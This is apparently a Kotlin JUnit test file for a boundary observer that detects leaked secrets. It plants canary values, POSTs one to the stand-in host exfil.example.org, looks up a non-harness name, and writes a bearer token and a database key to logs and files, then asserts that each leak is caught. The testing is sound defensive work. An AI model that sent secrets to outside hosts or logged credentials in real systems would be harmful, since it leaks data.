package pcs.runner

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Order
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertThrows
import pcs.testing.Covers
import pcs.testing.Family
import java.net.InetAddress
import java.net.URI
import java.net.UnknownHostException
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.nio.file.Files

/** The boundary observer's done-when (PLAN M3a): a planted canary to a non-harness host, and a planted log line holding the token. */
@Order(3)
@Family("T7")
class ObserverTest {
    private val planted = Canary("planted", "CANARY-PLANTED-REVIEW-7731", allowedOnHarnessWire = false)

    @Test
    @Covers("prop:C1", "prop:H4")
    fun `a canary sent to a non-harness host is refused and reported`() {
        BoundaryObserver(Session.harness, Session.canaries + planted).use { o ->
            o.installJvmWide()
            try {
                val resp =
                    HttpClient.newHttpClient().send(
                        HttpRequest.newBuilder(
                            URI("http://exfil.example.org/collect"),
                        ).POST(HttpRequest.BodyPublishers.ofString("review: ${planted.value}")).build(),
                        HttpResponse.BodyHandlers.ofString(),
                    )
                assertEquals(403, resp.statusCode())
            } finally {
                ProxyReset.restore()
            }
            val kinds = o.violations().map { it.kind to it.detail }
            assertTrue(kinds.any { it.first == "non-harness-destination" && it.second.startsWith("exfil.example.org") }, kinds.toString())
            assertTrue(kinds.any { it.first == "canary-to-non-harness-host" && it.second.contains("planted") }, kinds.toString())
        }
    }

    @Test
    @Covers("prop:H4")
    fun `a direct lookup of a non-harness name is refused by the resolver`() {
        BoundaryObserver(Session.harness, emptyList()).use { o ->
            assertThrows<UnknownHostException> { InetAddress.getByName("exfil-direct.example.org") }
            assertTrue(o.violations().any { it.kind == "refused-name-lookup" && it.detail == "exfil-direct.example.org" }, o.violations().toString())
        }
    }

    @Test
    @Covers("prop:H5")
    fun `a log line holding the token, and a file holding the database key, are caught`() {
        val token = Session.canaries.first { it.name == "token" }
        val dbKey = Session.canaries.first { it.name == "db-key" }
        val dir = Files.createTempDirectory("pcs-canary-files")
        val mon = FileWriteMonitor(listOf(dir), Session.canaries)
        LogCapture(Session.canaries).use { logs ->
            logs.start()
            mon.start()
            println("debug: connecting with Authorization: Bearer ${token.value}")
            Files.writeString(dir.resolve("notes.txt"), "key=${dbKey.value}")
            assertEquals(listOf("token"), logs.hits())
        }
        val found = mon.written().single()
        assertEquals(listOf("db-key"), found.canaries)
        dir.toFile().deleteRecursively()
    }
}
